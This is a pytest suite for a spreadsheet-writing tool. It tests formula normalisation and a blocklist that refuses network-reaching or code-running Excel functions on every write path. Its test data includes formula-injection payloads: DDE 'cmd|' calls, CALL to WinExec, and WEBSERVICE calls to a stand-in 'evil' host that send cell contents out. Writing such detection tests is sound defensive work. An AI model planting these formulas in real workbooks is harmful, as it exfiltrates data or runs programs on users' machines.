"""Formulas are stored the way Excel stores them: post-2007 functions with
their prefix, LET and LAMBDA parameters marked, spill and intersection
references in their file form, sheet names quoted; the blocklist matches
whole function names; formulas that spill or name a missing sheet warn."""

import asyncio
import sys
import zipfile
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).parent.parent))

openpyxl = pytest.importorskip("openpyxl")

from openpyxl.worksheet.table import Table

from excel import handle_write_xlsx
from formats.xlsx.formulas import blocked_functions, normalize, spills, unsafe_functions

_SHEETS = ["Data", "Sales Data", "R&D", "Q1-Q2", "Πωλήσεις", "A1"]


async def _ident(p, writing=False, **kw):
    return p


@pytest.fixture(autouse=True)
def _no_proxy(monkeypatch):
    async def _no_preview(path, filename=None):
        return None

    monkeypatch.setattr("shared._resolve_path", _ident)
    monkeypatch.setattr("shared._push_preview", _no_preview)
    monkeypatch.setattr("shared._notify_file_written", _no_preview)


def _write(path: Path, ops: list[dict], **extra) -> str:
    return asyncio.run(handle_write_xlsx({"path": str(path), "operations": ops, **extra}))


@pytest.mark.parametrize("formula, stored", [
    ("=XLOOKUP(A1,B:B,C:C)", "=_xlfn.XLOOKUP(A1,B:B,C:C)"),
    ("=_xlfn.XLOOKUP(A1,B:B,C:C)", "=_xlfn.XLOOKUP(A1,B:B,C:C)"),
    ("=IFS(A1>1,1,TRUE,0)+STDEV.S(B:B)", "=_xlfn.IFS(A1>1,1,TRUE,0)+_xlfn.STDEV.S(B:B)"),
    ("=FILTER(A1:A5,B1:B5>0)", "=_xlfn._xlws.FILTER(A1:A5,B1:B5>0)"),
    ("=SUM(A1:A3)", "=SUM(A1:A3)"),
    ("=SUM(A1#)", "=SUM(_xlfn.ANCHORARRAY(A1))"),
    ("=SUM('Sales Data'!B2#)", "=SUM(_xlfn.ANCHORARRAY('Sales Data'!B2))"),
    ("=@A1:A10", "=_xlfn.SINGLE(A1:A10)"),
    ("=@INDEX(A:A,2)", "=_xlfn.SINGLE(INDEX(A:A,2))"),
    ("=Sales[@Amount]*2", "=Sales[[#This Row],[Amount]]*2"),
    ("=Sales[@[Net amount]]", "=Sales[[#This Row],[Net amount]]"),
    ("=LET(x,A1*2,y,x+1,x*y)",
     "=_xlfn.LET(_xlpm.x,A1*2,_xlpm.y,_xlpm.x+1,_xlpm.x*_xlpm.y)"),
    ("=LAMBDA(a,b,a+b)(1,2)", "=_xlfn.LAMBDA(_xlpm.a,_xlpm.b,_xlpm.a+_xlpm.b)(1,2)"),
    ("=_xlfn.LET(_xlpm.x,1,_xlpm.x)", "=_xlfn.LET(_xlpm.x,1,_xlpm.x)"),
    ('="XLOOKUP(A1#)"&A1', '="XLOOKUP(A1#)"&A1'),
    # Excel stores these four bare, though they came after Excel 2007
    # ([MS-XLSX] 2.2.2's future-function-list); a prefix given is dropped.
    ("=NETWORKDAYS.INTL(A1,A2,1)", "=NETWORKDAYS.INTL(A1,A2,1)"),
    ("=_xlfn.NETWORKDAYS.INTL(A1,A2,1)", "=NETWORKDAYS.INTL(A1,A2,1)"),
    ("=WORKDAY.INTL(A1,10,1)+ISO.CEILING(B1)", "=WORKDAY.INTL(A1,10,1)+ISO.CEILING(B1)"),
    ("=ECMA.CEILING(A1,2)", "=ECMA.CEILING(A1,2)"),
    # The complex hyperbolic functions Excel stores with the prefix.
    ("=IMCOSH(A1)&IMTAN(A2)", "=_xlfn.IMCOSH(A1)&_xlfn.IMTAN(A2)"),
])
def test_stored_form(formula, stored):
    assert normalize(formula, _SHEETS).text == stored


@pytest.mark.parametrize("formula, stored", [
    ("=SUM(Sales Data!A1:A3)", "=SUM('Sales Data'!A1:A3)"),
    ("=R&D!B2+Q1-Q2!C3", "='R&D'!B2+'Q1-Q2'!C3"),
    ("=A1!B2", "='A1'!B2"),
    ("=Πωλήσεις!A1", "=Πωλήσεις!A1"),
    ("='Sales Data'!A1", "='Sales Data'!A1"),
    ('="Sales Data!A1"', '="Sales Data!A1"'),
])
def test_sheet_names_are_quoted_when_they_need_it(formula, stored):
    assert normalize(formula, _SHEETS).text == stored


def test_bare_text_keeps_no_equals_sign():
    assert normalize("Sales Data!$A$1:$A$9", _SHEETS, bare=True).text == "'Sales Data'!$A$1:$A$9"


@pytest.mark.parametrize("formula, spilling", [
    ("=FILTER(A:A,A:A>0)", "FILTER"),
    ("=IF(A1,SORT(B1:B9),0)", "SORT"),
    ("=SEQUENCE(10)", "SEQUENCE"),
    ("=SUM(UNIQUE(A:A))", None),
    ("=ROWS(FILTER(A:A,A:A>0))", None),
    ("=INDEX(SORT(A1:A9),1)", None),
    ("=XLOOKUP(A1,B:B,C:C)", None),
])
def test_spill_detection(formula, spilling):
    assert spills(formula) == spilling


def test_blocklist_matches_whole_names_with_prefixes_removed():
    blocked = frozenset({"WEBSERVICE", "RTD", "DGET", "INDIRECT"})
    assert blocked_functions("=_xlfn.WEBSERVICE(A1)", blocked) == ["WEBSERVICE"]
    assert blocked_functions("=webservice(A1)", blocked) == ["WEBSERVICE"]
    assert blocked_functions("=RTDATA!A1+MYDGETX(1)", blocked) == []
    assert blocked_functions("=cmd|'/c'!A0+INDIRECT(A1)", blocked) == ["INDIRECT"]


def test_write_cells_and_set_formula_store_the_excel_form(tmp_path):
    f = tmp_path / "f.xlsx"
    msg = _write(f, [
        {"op": "create_sheet", "name": "Sales Data"},
        {"op": "write_cells", "cells": [
            {"cell": "A1", "value": "=XLOOKUP(B1,C:C,D:D)"},
            {"cell": "A2", "value": "=SUM(Sales Data!A1:A3)"},
            {"cell": "A3", "value": "=XLOOKUP(B1,C:C,D:D)", "type": "text"},
        ]},
        {"op": "write_cells", "start_cell": "B5", "data": [["=TEXTJOIN(\",\",TRUE,C1:C3)"]]},
        {"op": "set_formula", "cell": "A4", "formula": "MAXIFS(C:C,D:D,\"x\")"},
    ])
    ws = openpyxl.load_workbook(f)["Sheet"]
    assert ws["A1"].value == "=_xlfn.XLOOKUP(B1,C:C,D:D)"
    assert ws["A2"].value == "=SUM('Sales Data'!A1:A3)"
    assert ws["B5"].value == '=_xlfn.TEXTJOIN(",",TRUE,C1:C3)'
    assert ws["A4"].value == '=_xlfn.MAXIFS(C:C,D:D,"x")'
    assert "the sheet name 'Sales Data' was quoted" in msg


def test_set_formula_refuses_a_prefixed_blocked_function_and_allows_rtdata(tmp_path):
    f = tmp_path / "b.xlsx"
    msg = _write(f, [
        {"op": "create_sheet", "name": "RTDATA"},
        {"op": "set_formula", "cell": "A1", "formula": "=_xlfn.WEBSERVICE(\"http://x\")"},
        {"op": "set_formula", "cell": "A2", "formula": "=RTDATA!B1*2"},
        {"op": "set_formula", "cell": "A3", "formula": '=IF(A2>0,"(",")")'},
    ], best_effort=True)
    assert "op #1 set_formula: Sheet!A1: the formula contains the blocked function 'WEBSERVICE'" in msg
    ws = openpyxl.load_workbook(f)["Sheet"]
    assert ws["A1"].value is None
    assert ws["A2"].value == "=RTDATA!B1*2"
    assert ws["A3"].value == '=IF(A2>0,"(",")")'


def test_a_sheet_created_later_in_the_batch_is_quoted_and_a_missing_one_warns(tmp_path):
    f = tmp_path / "late.xlsx"
    msg = _write(f, [
        {"op": "write_cells", "cells": [
            {"cell": "A1", "value": "=Sales Data!B2"},
            {"cell": "A2", "value": "=Budget!B2"},
        ]},
        {"op": "create_sheet", "name": "Sales Data"},
    ])
    ws = openpyxl.load_workbook(f)["Sheet"]
    assert ws["A1"].value == "='Sales Data'!B2"
    assert "Sheet!A2: the formula is broken: it names a sheet the workbook does not have" in msg


def test_a_spilling_formula_is_noted_and_spills(tmp_path):
    f = tmp_path / "s.xlsx"
    msg = _write(f, [{"op": "write_cells", "cells": [
        {"cell": "A1", "value": "=UNIQUE(B1:B9)"},
        {"cell": "A2", "value": "=SUM(UNIQUE(B1:B9))"},
    ]}])
    assert msg.count("spills: Excel shows its results") == 1
    assert "UNIQUE spills" in msg
    assert "Warnings" not in msg
    with zipfile.ZipFile(f) as zf:
        assert '<c r="A1" cm="1">' in zf.read("xl/worksheets/sheet1.xml").decode()


def test_bare_this_row_takes_the_table_holding_the_cell(tmp_path):
    f = tmp_path / "t.xlsx"
    wb = openpyxl.Workbook()
    ws = wb.active
    ws.append(["Item", "Amount", "Tax"])
    ws.append(["a", 10, None])
    ws.add_table(Table(displayName="Sales", ref="A1:C2"))
    wb.save(f)
    _write(f, [{"op": "write_cells", "cells": [{"cell": "C2", "value": "=[@Amount]*0.2"}]}])
    assert openpyxl.load_workbook(f).active["C2"].value == "=Sales[[#This Row],[Amount]]*0.2"


def test_conditional_format_and_validation_formulas_are_stored(tmp_path):
    f = tmp_path / "cf.xlsx"
    _write(f, [
        {"op": "create_sheet", "name": "Sales Data"},
        {"op": "conditional_format", "range": "A1:A9", "rule_type": "formula",
         "formula": "A1>MAXIFS(Sales Data!B:B,Sales Data!C:C,1)", "fill_color": "FFC7CE"},
        {"op": "add_data_validation", "range": "B1:B9", "validation_type": "custom",
         "formula": "COUNTIFS(Sales Data!A:A,B1)>0"},
    ])
    ws = openpyxl.load_workbook(f)["Sheet"]
    rule = next(iter(ws.conditional_formatting)).rules[0]
    assert rule.formula == ["A1>_xlfn.MAXIFS('Sales Data'!B:B,'Sales Data'!C:C,1)"]
    assert ws.data_validations.dataValidation[0].formula1 == "COUNTIFS('Sales Data'!A:A,B1)>0"


def test_text_conditional_format_anchors_on_the_bounding_top_left(tmp_path):
    f = tmp_path / "anchor.xlsx"
    _write(f, [{"op": "conditional_format", "range": "C1:C5 A3:A5", "rule_type": "cell_is",
                "operator": "containsText", "formula": "late", "fill_color": "FFC7CE"}])
    ws = openpyxl.load_workbook(f).active
    rule = next(iter(ws.conditional_formatting)).rules[0]
    assert rule.formula == ['NOT(ISERROR(SEARCH("late",A1)))']


@pytest.mark.parametrize("formula, stored", [
    ("=SUM(A3:XLOOKUP(6,A:A,A:A))", "=SUM(A3:_xlfn.XLOOKUP(6,A:A,A:A))"),
    ("=SUM(XLOOKUP(1,A:A,B:B):XLOOKUP(2,A:A,B:B))",
     "=SUM(_xlfn.XLOOKUP(1,A:A,B:B):_xlfn.XLOOKUP(2,A:A,B:B))"),
    ("=SUM(Data!A1:XLOOKUP(6,Data!A:A,Data!A:A))",
     "=SUM(Data!A1:_xlfn.XLOOKUP(6,Data!A:A,Data!A:A))"),
])
def test_function_joined_to_a_reference_is_prefixed(formula, stored):
    assert normalize(formula, _SHEETS).text == stored


_BLOCKED = frozenset({"INDIRECT", "WEBSERVICE", "DGET", "RTD"})


@pytest.mark.parametrize("formula, found", [
    ('=SUM(A1:INDIRECT("B5"))', ["INDIRECT"]),
    ('=COUNTA(A1:WEBSERVICE("http://x"))', ["WEBSERVICE"]),
    ('=WEBSERVICE ("http://x")', ["WEBSERVICE"]),
    ('=SUM(1)+WEBSERVICE  ("x")', ["WEBSERVICE"]),
    ('=WEBSERVICE\n("x")', ["WEBSERVICE"]),
    ('=_xlws.WEBSERVICE("x")', ["WEBSERVICE"]),
    ('=com.microsoft.RTD("a","b","c")', ["RTD"]),
    ('=_xludf.Dget(A1:B5,1,C1:C2)', ["DGET"]),
    ('=Indirect("A1")', ["INDIRECT"]),
    ('=SUM(INDEX(A:A,1):INDIRECT("A9"))', ["INDIRECT"]),
    ('="WEBSERVICE(x)"&RTDATA!A1+MYDGETX(1)', []),
    ("='INDIRECT('!A1", []),
])
def test_blocklist_catches_every_call_spelling(formula, found):
    assert blocked_functions(formula, _BLOCKED) == found


def test_set_formula_refuses_a_blocked_call_after_a_colon_or_a_space(tmp_path):
    f = tmp_path / "b2.xlsx"
    msg = _write(f, [
        {"op": "set_formula", "cell": "A1", "formula": '=COUNTA(A2:WEBSERVICE("http://x"))'},
        {"op": "set_formula", "cell": "A2", "formula": '=WEBSERVICE ("http://x")'},
    ])
    assert msg.count("blocked function") == 2
    assert "Nothing saved" in msg and not f.exists()


def test_bare_this_row_outside_a_table_is_refused(tmp_path):
    f = tmp_path / "nt.xlsx"
    msg = _write(f, [
        {"op": "write_cells", "cells": [{"cell": "A1", "value": 5}]},
        {"op": "write_cells", "cells": [{"cell": "B2", "value": "=[@Price]*2"}]},
    ], best_effort=True)
    assert "op #1 write_cells: Sheet!B2: [@Price] works only inside a table" in msg
    assert "[[#This Row],[Price]]" in msg
    assert openpyxl.load_workbook(f).active["B2"].value is None


@pytest.mark.parametrize("formula, stored", [
    ("=_xlfn.FILTER(A1:A5,B1:B5>0)", "=_xlfn._xlws.FILTER(A1:A5,B1:B5>0)"),
    ("=_xlfn.sort(A1:A5)", "=_xlfn._xlws.sort(A1:A5)"),
    ("=_xlfn._xlws.SORT(A1:A5)", "=_xlfn._xlws.SORT(A1:A5)"),
])
def test_worksheet_functions_get_their_whole_prefix(formula, stored):
    assert normalize(formula, _SHEETS).text == stored


# ---------------------------------------------------------------------------
# Functions that reach the network or run code, refused on every write path
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("formula, name", [
    ('=WEBSERVICE("http://x/?d="&A1)', "WEBSERVICE"),
    ('=IMAGE("http://x/logo.png")', "IMAGE"),
    ('=RTD("srv",,"topic")', "RTD"),
    ('=CALL("kernel32","WinExec","JCJ","calc",0)', "CALL"),
    ('=REGISTER.ID("lib","fn")', "REGISTER.ID"),
    ('=DDE("soffice";"file";"A1")', "DDE"),
    ("=cmd|'/c calc'!A0", "DDE"),
    ('=_xlfn.STOCKHISTORY("MSFT",TODAY())', "STOCKHISTORY"),
    ('=_xlfn.TRANSLATE(A1,"en","el")', "TRANSLATE"),
    ('=_xlfn._xlws.PY("x",0)', "PY"),
    ("=_xlfn.BYROW(A1:A3,_xlfn._xleta.WEBSERVICE)", "WEBSERVICE"),
    ('=SUM(1)+webservice  ("x")', "WEBSERVICE"),
])
def test_unsafe_functions_are_found_in_every_spelling(formula, name):
    assert name in unsafe_functions(formula)


@pytest.mark.parametrize("formula", [
    '=INDIRECT("Data!A"&B1)', "=DGET(A1:C9,2,E1:E2)", '="WEBSERVICE(x) | CALL"&A1',
    "=RTDATA!A1+Image_count", "=HYPERLINK(\"https://example.com\",\"site\")",
    "=FILTERXML(A1,\"//b\")", "='a|b'!A1",
])
def test_ordinary_formulas_are_not_unsafe(formula):
    assert unsafe_functions(formula) == []


@pytest.mark.parametrize("op", [
    {"op": "write_cells", "cells": [{"cell": "A1", "value": '=WEBSERVICE("http://x")'}]},
    {"op": "write_cells", "start_cell": "A1", "data": [['=IMAGE("http://x")']]},
    {"op": "set_formula", "cell": "A1", "formula": "cmd|'/c calc'!A0"},
    {"op": "conditional_format", "range": "A1:A3", "rule_type": "formula",
     "formula": 'LEN(WEBSERVICE("http://x"))>0', "fill_color": "FFC7CE"},
    {"op": "add_data_validation", "range": "B1:B3", "validation_type": "custom",
     "formula": 'ISTEXT(WEBSERVICE("http://x"))'},
    {"op": "add_data_validation", "range": "B1:B3", "validation_type": "whole",
     "operator": "lessThan", "value": '=LEN(WEBSERVICE("http://x"))'},
    {"op": "define_name", "name": "Feed", "range": 'WEBSERVICE("http://x")'},
])
def test_every_formula_path_refuses_an_unsafe_function(tmp_path, op):
    f = tmp_path / "unsafe.xlsx"
    msg = _write(f, [op])
    assert "reaches the network or runs a program" in msg and "Nothing saved" in msg
    assert not f.exists()


def test_indirect_and_dget_are_allowed_now(tmp_path):
    f = tmp_path / "lookups.xlsx"
    msg = _write(f, [
        {"op": "set_formula", "cell": "A1", "formula": 'INDIRECT("B"&C1)'},
        {"op": "write_cells", "cells": [{"cell": "A2", "value": "=DGET(D1:E5,2,F1:F2)"}]},
    ])
    assert msg.startswith("Workbook saved"), msg
    ws = openpyxl.load_workbook(f).active
    assert ws["A1"].value == '=INDIRECT("B"&C1)' and ws["A2"].value == "=DGET(D1:E5,2,F1:F2)"


# ---------------------------------------------------------------------------
# The holes a per-path check missed, and the backstop behind them
# ---------------------------------------------------------------------------

_EVIL = 'WEBSERVICE("http://evil/x")'


def _stored_formulas(path: Path) -> str:
    """Every formula text the saved package carries: cell formulas, rule
    formulas and thresholds, validation formulas, names."""
    import re
    import zipfile

    with zipfile.ZipFile(path) as zf:
        xml = "".join(zf.read(n).decode() for n in zf.namelist() if n.endswith(".xml"))
    found = re.findall(r"<f>(.*?)</f>|<formula>(.*?)</formula>|<formula1>(.*?)</formula1>|"
                       r'<cfvo [^>]*val="([^"]*)"|<definedName [^>]*>(.*?)</definedName>', xml)
    return " ".join("".join(groups) for groups in found)


def test_type_text_keeps_an_equals_value_as_text(tmp_path):
    f = tmp_path / "text.xlsx"
    msg = _write(f, [{"op": "write_cells", "cells": [{"cell": "A1", "value": "=" + _EVIL, "type": "text"}]}])
    assert msg.startswith("Workbook saved"), msg
    cell = openpyxl.load_workbook(f).active["A1"]
    assert cell.value == "=" + _EVIL and cell.data_type == "s"
    assert "WEBSERVICE" not in _stored_formulas(f)


def test_a_link_label_is_text_and_a_link_location_must_be_a_place(tmp_path):
    f = tmp_path / "link.xlsx"
    msg = _write(f, [{"op": "add_hyperlink", "cell": "A1", "url": "https://example.com", "text": "=" + _EVIL}])
    assert msg.startswith("Workbook saved"), msg
    cell = openpyxl.load_workbook(f).active["A1"]
    assert cell.data_type == "s" and "WEBSERVICE" not in _stored_formulas(f)
    g = tmp_path / "location.xlsx"
    msg = _write(g, [{"op": "add_hyperlink", "cell": "A1", "location": "=" + _EVIL}])
    assert "is not a cell, a range or a defined name" in msg and not g.exists()
    msg = _write(g, [{"op": "add_hyperlink", "cell": "A1", "location": "NoSuchName"}])
    assert "no defined name 'NoSuchName'" in msg and not g.exists()


@pytest.mark.parametrize("chart", [
    {"categories": ["=" + _EVIL, "b"], "series": [{"name": "s", "values": [1, 2]}]},
    {"categories": ["a", "b"], "series": [{"name": "=" + _EVIL, "values": [1, 2]}]},
])
def test_chart_labels_are_written_as_text(tmp_path, chart):
    f = tmp_path / "chart.xlsx"
    msg = _write(f, [{"op": "add_chart", **chart}])
    assert msg.startswith("Workbook saved"), msg
    assert "WEBSERVICE" not in _stored_formulas(f)


def test_chart_values_pass_the_formula_check(tmp_path):
    f = tmp_path / "values.xlsx"
    msg = _write(f, [{"op": "add_chart", "categories": ["a", "b"],
                      "series": [{"name": "s", "values": ["=" + _EVIL, 2]}]}])
    assert "reaches the network or runs a program" in msg and not f.exists()


@pytest.mark.parametrize("rule", [
    {"rule_type": "formula", "formula": '"a"&' + _EVIL + '<>""', "fill_color": "FFC7CE"},
    {"rule_type": "cell_is", "operator": "equal", "formula": '"a"&' + _EVIL, "fill_color": "FFC7CE"},
    {"rule_type": "cell_is", "operator": "between", "formula": ['"a"&' + _EVIL, 5], "bold": True},
    {"rule_type": "cell_is", "operator": "containsText", "formula": '"a"&' + _EVIL, "bold": True},
    {"rule_type": "color_scale", "colors": ["FFFFFF", "000000"], "start_type": "formula",
     "start_value": _EVIL},
    {"rule_type": "color_scale", "colors": ["FFFFFF", "FFEB84", "000000"], "mid_type": "formula",
     "mid_value": _EVIL},
    {"rule_type": "data_bar", "end_type": "formula", "end_value": _EVIL},
    {"rule_type": "icon_set", "icon_style": "3Arrows", "threshold_type": "formula",
     "values": [0, _EVIL, 5]},
])
def test_rule_operands_and_thresholds_pass_the_formula_check(tmp_path, rule):
    f = tmp_path / "rule.xlsx"
    msg = _write(f, [{"op": "conditional_format", "range": "A1:A5", **rule}])
    assert "reaches the network or runs a program" in msg and not f.exists()


@pytest.mark.parametrize("op", [
    {"op": "write_cells", "cells": [{"cell": "A1", "value": "=" + _EVIL}]},
    {"op": "set_formula", "cell": "A1", "formula": _EVIL},
    {"op": "conditional_format", "range": "A1:A5", "rule_type": "formula", "formula": f"LEN({_EVIL})>0",
     "fill_color": "FFC7CE"},
    {"op": "add_data_validation", "range": "B1:B3", "validation_type": "custom", "formula": f"ISTEXT({_EVIL})"},
    {"op": "define_name", "name": "Feed", "range": _EVIL},
    {"op": "add_chart", "categories": ["a"], "series": [{"name": "s", "values": ["=" + _EVIL]}]},
])
def test_the_backstop_catches_a_path_whose_own_check_is_gone(tmp_path, monkeypatch, op):
    import excel

    monkeypatch.setattr(excel, "_refuse_unsafe", lambda text, where: None)
    f = tmp_path / "backstop.xlsx"
    msg = _write(f, [op], best_effort=True)
    assert msg.startswith("Nothing saved"), msg
    assert "WEBSERVICE" in msg and "reaches the network or runs a program" in msg
    assert not f.exists()


def test_the_backstop_names_the_cell(tmp_path, monkeypatch):
    import excel

    monkeypatch.setattr(excel, "_refuse_unsafe", lambda text, where: None)
    f = tmp_path / "named.xlsx"
    msg = _write(f, [{"op": "write_cells", "cells": [{"cell": "C7", "value": "=" + _EVIL}]}])
    assert "Sheet!C7: WEBSERVICE" in msg


def test_formulas_the_file_already_had_are_kept_through_an_edit(tmp_path):
    f = tmp_path / "theirs.xlsx"
    wb = openpyxl.Workbook()
    ws = wb.active
    ws["A1"] = "=" + _EVIL
    ws["A2"] = "=1+1"
    wb.save(f)
    msg = _write(f, [{"op": "write_cells", "cells": [{"cell": "B1", "value": 3}]},
                     {"op": "insert_rows", "row": 1}])
    assert msg.startswith("Workbook saved"), msg
    assert openpyxl.load_workbook(f).active["A2"].value == "=" + _EVIL
    msg = _write(f, [{"op": "copy_range", "source_range": "A2", "target_start": "D1"}])
    assert "reaches the network or runs a program" in msg
    msg = _write(f, [{"op": "copy_sheet", "source": "Sheet", "new_name": "Copy"}])
    assert "reaches the network or runs a program" in msg and "Sheet!A2" in msg
